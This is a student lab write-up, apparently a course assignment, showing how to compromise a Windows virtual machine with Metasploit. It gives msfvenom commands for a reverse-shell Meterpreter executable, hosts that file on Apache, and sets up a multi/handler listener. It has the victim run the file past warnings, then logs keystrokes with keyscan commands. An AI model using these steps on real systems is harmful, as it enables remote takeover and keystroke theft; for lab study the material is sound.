# Compromising-windows-using-Metasploit
## NAME:Dharunyadevi S
## REGISTER NUMBER:212223220018
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="1133" height="506" alt="image" src="https://github.com/user-attachments/assets/4bfaf17a-2563-47b1-bd71-fa15dc7790bf" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 -f exe > dharunya.exe```

### Output:
<img width="1139" height="258" alt="image" src="https://github.com/user-attachments/assets/3ebd4bf6-333f-4865-903b-f25147a4812d" />

copy the dharunya.exe into the apache /var/www/html folder

<img width="478" height="82" alt="image" src="https://github.com/user-attachments/assets/382caa03-6cc7-46ba-ac9b-1d1456f63fdd" />

Start apache server
sudo systemctl apache2 start

<img width="463" height="75" alt="image" src="https://github.com/user-attachments/assets/575150d8-7122-4a6b-b8b0-85d972055ccc" />

Check the status of apache2
<img width="1112" height="492" alt="image" src="https://github.com/user-attachments/assets/79cc7318-68ee-47a0-be42-81cbda838ea8" />

Invoke msfconsole:
## OUTPUT:

<img width="1010" height="737" alt="image" src="https://github.com/user-attachments/assets/c0ab0328-6859-4b2a-b879-de0e40e10f56" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="1140" height="710" alt="image" src="https://github.com/user-attachments/assets/951a088a-f643-4fcc-8010-4ac5d47f5a7b" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.2.15
exploit

<img width="886" height="256" alt="image" src="https://github.com/user-attachments/assets/d6d88aac-af11-426e-8d3c-1c5cbe4b731d" />

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/dharunya.exe``` The file "dharunya.exe" downloads.

### Output

<img width="1170" height="873" alt="image" src="https://github.com/user-attachments/assets/ba81f91d-18d4-47a0-9c36-ea5f4d616149" />


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="935" height="744" alt="image" src="https://github.com/user-attachments/assets/bd509409-51af-43c7-b79f-f5f00622c785" />

The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name

<img width="388" height="59" alt="image" src="https://github.com/user-attachments/assets/5c539cbd-4376-4e73-9f45-0ebe51afc4fb" />

<img width="1167" height="874" alt="image" src="https://github.com/user-attachments/assets/01ebaf58-5b28-4e7e-83d5-86394b098770" />


keyscan_dump	Shows the keystrokes captured so far

<img width="576" height="223" alt="image" src="https://github.com/user-attachments/assets/a9cef6ad-4c30-4c8f-9ef7-d2467f501492" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

